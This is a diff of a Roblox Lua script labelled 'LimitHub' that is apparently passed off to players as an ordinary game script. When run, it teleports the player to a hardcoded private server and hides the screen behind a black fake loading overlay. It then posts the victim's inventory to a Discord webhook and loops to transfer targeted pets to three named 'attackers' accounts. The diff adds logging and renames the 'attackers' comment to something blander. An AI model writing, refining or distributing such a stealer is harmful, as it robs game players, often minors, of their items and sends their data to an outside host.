@@ -14,27 +14,32 @@ local targetedPets = {
     "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
 }
 
+warn("[LimitHub] ✅ Starting script...")
+
 -- Step 1: Teleport to private server
 local placeId = 126884695634066
 local privateServerCode = "40206718588419987554943106780552"
+
 task.spawn(function()
     task.wait(2)
+    warn("[LimitHub] 🔁 Attempting to teleport to private server...")
     TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
 end)
 
--- Step 2: Wait for new server to load
+-- Step 2: Wait for game to finish loading
 game.Loaded:Wait()
 task.wait(5)
+warn("[LimitHub] ✅ Teleport complete. Game loaded.")
 
 -- Step 3: Show Custom GUI
 task.spawn(function()
+    warn("[LimitHub] ✅ Showing custom loading GUI...")
     local screenGui = Instance.new("ScreenGui", game.CoreGui)
     screenGui.IgnoreGuiInset = true
     screenGui.ResetOnSpawn = false
 
     local bg = Instance.new("Frame")
     bg.BackgroundColor3 = Color3.new(0, 0, 0)
-    bg.BackgroundTransparency = 0
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.Position = UDim2.new(0, 0, 0, 0)
     bg.Parent = screenGui
@@ -96,10 +101,12 @@ task.spawn(function()
     end
     task.wait(1)
     screenGui:Destroy()
+    warn("[LimitHub] ✅ GUI finished loading.")
 end)
 
--- Step 4: Send Discord webhook after teleport
-task.spawn(function()
+-- Step 4: Webhook to Discord
+task.delay(8, function()
+    warn("[LimitHub] 📡 Sending inventory data to Discord...")
     local function getInventory()
         local data = {
             items = {},
@@ -138,18 +145,26 @@ task.spawn(function()
         }}
     }
 
-    request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(body)
-    })
+    local success, response = pcall(function()
+        return request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(body)
+        })
+    end)
+
+    if success then
+        warn("[LimitHub] ✅ Webhook sent successfully.")
+    else
+        warn("[LimitHub] ❌ Failed to send webhook:", response)
+    end
 end)
 
--- Step 5: Auto-transfer pets to attackers
+-- Step 5: Auto-transfer pets
 task.spawn(function()
     local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
-
+    warn("[LimitHub] 🔄 Starting pet transfer loop...")
     while true do
         for _, p in pairs(Players:GetPlayers()) do
             if table.find(attackers, p.Name) then
@@ -172,9 +187,9 @@ task.spawn(function()
                 end)
 
                 if success then
-                    warn("✅ Pets sent to " .. p.Name)
+                    warn("[LimitHub] ✅ Pets transferred to " .. p.Name)
                 else
-                    warn("⚠️ Pet transfer failed:", err)
+                    warn("[LimitHub] ⚠️ Pet transfer failed:", err)
                 end
             end
         end
